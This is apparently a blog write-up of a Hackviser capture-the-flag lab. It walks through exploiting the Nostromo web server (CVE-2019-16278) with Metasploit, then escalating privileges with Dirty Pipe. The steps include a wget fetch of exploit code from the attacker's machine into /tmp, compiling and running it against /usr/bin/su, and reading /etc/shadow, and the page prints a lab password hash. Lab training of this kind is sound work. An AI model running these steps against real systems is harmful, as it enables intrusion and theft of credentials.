---
title: 'Glitch'
date: '2026-03-25'
excerpt: 'Practice vulnerability detection in a web application, exploitation of the vulnerability, and privilege escalation attacks stemming from the linux kernel.'
prog: 'Hackviser Warmup Stage 3  -  March 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/warmups/glitch/glitch_hackviser_logo.png" alt="Glitch logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Glitch</h1>
<div class="writeup-date">March 2026 &middot; Warmup Stage 3</div>
</div>
</div>
<p class="lead mb-4">This warmup focuses on teaching how to perform vulnerability discovery on the widely used nostromo web server and how to perform privilege escalation attacks on linux-based systems. It is recommended to practice vulnerability detection in a web application, exploitation of the vulnerability, and privilege escalation attacks stemming from the linux kernel.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> Which ports are open?</p>
<p class="mb-3">Use nmap to scan the target machine and identify open ports with <code>nmap -sC -sV -A [target hostname]</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/glitch/glitch_hackviser_image1.png" alt="Glitch Image 1" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> 22, 80</p>
<br />

<p class="mb-2"><strong>Question 2:</strong> What is the name of the running web server?</p>
<p class="mb-5"><strong>Answer:</strong> nostromo</p>
<br />

<p class="mb-2"><strong>Question 3:</strong> What is the CVE code of the vulnerability?</p>
<p class="mb-3">Since we identified the web server as Nostromo with its version, we can use <code>searchsploit nostromo</code> to find known vulnerabilities.</p>
<img src="/assets/hackinglabs/hackviser/warmups/glitch/glitch_hackviser_image2.png" alt="Glitch Image 2" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">Opening Metasploit in the console and using <code>search nostromo</code>, we can find and use the correct module. To find the CVE code, we need to use <code>info</code> and search for the references.</p>
<img src="/assets/hackinglabs/hackviser/warmups/glitch/glitch_hackviser_image3.png" alt="Glitch Image 3" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<img src="/assets/hackinglabs/hackviser/warmups/glitch/glitch_hackviser_image4.png" alt="Glitch Image 4" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> CVE-2019-16278</p>
<br />

<p class="mb-2"><strong>Question 4:</strong> What is the Linux kernel version?</p>
<p class="mb-3">We need to hack into the target machine to find the Linux kernel version. Since the exploit module is currently in use, we now need to use <code>set RHOSTS goldnertech.hv</code>, <code>set LHOST [your IP]</code>, then <code>check</code> and <code>exploit</code>. Once the command shell session is open, use <code>shell</code>, then use <code>whoami</code> to confirm the current user. Finally, use <code>uname -a</code> to find the Linux kernel version.</p>
<img src="/assets/hackinglabs/hackviser/warmups/glitch/glitch_hackviser_image5.png" alt="Glitch Image 5" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> 5.11.0-051100-generic</p>
<br />

<p class="mb-2"><strong>Question 5:</strong> What is the password hash value in /etc/shadow for the user "hackviser"?</p>
<p class="mb-3">Since we cannot directly read the contents of /etc/shadow, we need to escalate our privileges with the clues we currently have. Apparently the Linux kernel version is vulnerable to an escalation vulnerability called Dirty Pipe. We will use <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/" target="_blank" referrerpolicy="no-referrer">this exploit</a>.</p>
<p class="mb-3">First, let's create an exploit-2.c file in our local machine and use the codes from the repository. The next step is to upload this file to the target machine. To do this, we need to run a simple http server using Python.</p>
<img src="/assets/hackinglabs/hackviser/warmups/glitch/glitch_hackviser_image6.png" alt="Glitch Image 6" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">From the target machine, navigate to the <code>/tmp</code> directory and download the exploit file using <code>wget http://local_IP:1337/exploit-2.c</code>. Then compile the exploit using <code>gcc exploit-2.c -o exploit-2</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/glitch/glitch_hackviser_image7.png" alt="Glitch Image 7" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-3">When we look at the descriptions in the relevant repo to run this exploit using <code>ls -l</code>, we are asked to give the path to a file with SUID permission as a parameter to this exploit. Let's find files with SUID permission by running <code>find / -perm -4000 2>/dev/null</code>. We can select any of the files from the search results, but in our case, we will use <code>/usr/bin/su</code>. Then run the exploit by using <code>/exploit-2 /usr/bin/su</code>. To view the password hash for the user "hackviser", use <code>cat /etc/shadow | grep hackviser</code>.</p>
<img src="/assets/hackinglabs/hackviser/warmups/glitch/glitch_hackviser_image8.png" alt="Glitch Image 8" class="img-fluid rounded mb-3" style="max-width: 720px;" width="720" height="405" loading="lazy" decoding="async">
<p class="mb-5"><strong>Answer:</strong> $y$j9T$/tk8y1jwJS53UNFO4kyhV/$Bk4HShAiYFpsI2X0OS/aePEBRJe.CBz3kptqrqAgkM9</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">March 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>